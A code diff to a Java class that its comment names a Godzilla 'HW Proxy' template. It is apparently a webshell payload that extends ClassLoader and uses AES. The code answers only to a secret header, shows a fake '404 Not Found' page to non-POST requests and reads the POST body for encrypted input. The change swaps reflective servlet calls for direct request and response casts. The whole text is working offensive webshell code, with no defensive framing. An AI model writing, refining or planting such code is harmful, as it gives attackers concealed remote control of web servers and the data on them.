@@ -6,6 +6,8 @@ import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 /**
  * Godzilla HW Proxy 模板（JAVA_AES_BASE64_PROFILE）。
@@ -71,12 +73,15 @@ public class GodzillaHwProxyProfile extends ClassLoader {
 
     @SuppressWarnings("all")
     private boolean run(Object request, Object response) throws Exception {
-        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        String value = ((HttpServletRequest) request).getHeader(headerName);
         if (value == null || !value.contains(headerValue)) {
             return false;
         }
-        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
-        String method = (String) request.getClass().getMethod("getMethod").invoke(request);
+        if (((HttpServletResponse) response).isCommitted()) {
+            return true;
+        }
+        PrintWriter writer = ((HttpServletResponse) response).getWriter();
+        String method = ((HttpServletRequest) request).getMethod();
         if (!"POST".equalsIgnoreCase(method)) {
             writer.write(style.replace("##style##", "404 Not Found"));
             writer.flush();
@@ -119,7 +124,7 @@ public class GodzillaHwProxyProfile extends ClassLoader {
 
     @SuppressWarnings("all")
     private static String readBodyString(Object request) throws Exception {
-        java.io.BufferedReader reader = (java.io.BufferedReader) request.getClass().getMethod("getReader").invoke(request);
+        java.io.BufferedReader reader = ((HttpServletRequest) request).getReader();
         StringBuilder builder = new StringBuilder();
         String line;
         while ((line = reader.readLine()) != null) {
